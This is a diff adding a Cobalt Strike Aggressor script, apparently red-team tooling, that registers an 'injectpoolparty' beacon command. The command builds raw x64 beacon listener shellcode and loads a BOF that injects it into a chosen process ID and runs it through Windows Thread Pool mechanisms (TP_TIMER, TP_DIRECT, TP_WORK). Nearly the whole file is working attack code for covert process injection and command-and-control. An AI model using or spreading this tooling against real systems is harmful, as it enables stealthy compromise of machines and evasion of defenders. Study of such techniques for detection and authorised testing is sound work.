@@ -1,0 +1,49 @@
+# author REDMED-X
+
+beacon_command_register(
+	"injectpoolparty", "Inject listener shellcode in specified process and execute it via Windows Thread Pools.",
+	"INFO:\nInject listener shellcode in specified process and execute it via Windows Thread Pools.\nThe following execution variants are supported: TP_TIMER (variant 8) | TP_DIRECT (variant 7 | TP_WORK (variant 2).\nThe following beacon shellcode configuration is injected: x64, process, indirect. This can be changed in the .cna script.\n\n" .
+	"ARGUMENTS:\n[<variant>]: Windows Thread Pool execution variant: TP_TIMER | TP_DIRECT | TP_WORK (susceptible to slow execution time).\n[<pid>]: Process ID of the target process.\n[<listener>]: Beacon listener name.\n\n" .
+	"USAGE:\ninjectpoolparty <variant> <pid> <listener>\n\n" .
+	"EXAMPLES:\ninjectpoolparty TP_TIMER 1234 Shorthaul-HTTPS\n\n");
+	
+alias injectpoolparty {
+    $bid = $1;
+    $variant = $2;
+    $pid = $3;
+	$listener = $4;
+
+    if ($variant eq "TP_TIMER" || $variant eq "TP_DIRECT" || $variant eq "TP_WORK") {
+        if ($pid eq "") {
+            berror($bid, "Please specify the process ID (pid) of the target process.\n");
+            return;
+        }
+    }
+    else {
+        berror($bid, "Please specify one of the following execution variants: TP_TIMER | TP_DIRECT | TP_WORK (susceptible to slow execution time).\n");
+        return;
+    }
+	
+	# Read in the right BOF file
+	$handle = openf(script_resource("injectpoolparty.o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	
+	if (listener_info($listener) is $null) {
+		berror($bid, "Specified listener was not found: $listener");
+	}
+	else {
+		$sc_data = artifact_payload($listener, "raw", "x64", "process", "Indirect");
+
+		# Pack our arguments
+		$arg_data  = bof_pack($bid, "zib", $variant, $pid, $sc_data);
+
+		blog($bid, "Tasked to start a new listener..");
+		beacon_inline_execute($bid, $data, "go", $arg_data);
+	}
+}
+
+
+
+
+
